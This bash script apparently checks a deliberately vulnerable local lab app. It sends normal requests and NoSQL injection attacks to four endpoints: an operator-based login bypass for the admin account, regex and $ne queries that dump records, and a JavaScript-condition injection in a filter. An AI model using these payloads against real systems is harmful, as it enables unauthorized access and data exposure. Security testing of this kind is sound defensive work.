#!/usr/bin/env bash
# Quick check that the 4 endpoints work normally AND are exploitable (with PROTECTION=none).
B=${1:-http://localhost:3000}
j='-H Content-Type:application/json'
echo "--- health";            curl -s $B/health; echo
echo "--- login normal";      curl -s $j -d '{"username":"alice","password":"alice123"}' $B/login; echo
echo "--- login ATTACK";      curl -s $j -d '{"username":"admin","password":{"$ne":null}}' $B/login; echo
echo "--- search normal";     curl -s "$B/search?q=Laptop"; echo
echo "--- search ATTACK";     curl -s -g "$B/search?q[\$regex]=.*" | head -c 200; echo
echo "--- profile normal";    curl -s "$B/profile?username=alice"; echo
echo "--- profile ATTACK";    curl -s -g "$B/profile?username[\$ne]=x"; echo
echo "--- filter normal";     curl -s "$B/filter?category=books&maxPrice=500" | head -c 200; echo
echo "--- filter ATTACK";     curl -s -G --data-urlencode "category=x' || '1'=='1" --data-urlencode "maxPrice=0" $B/filter | head -c 200; echo
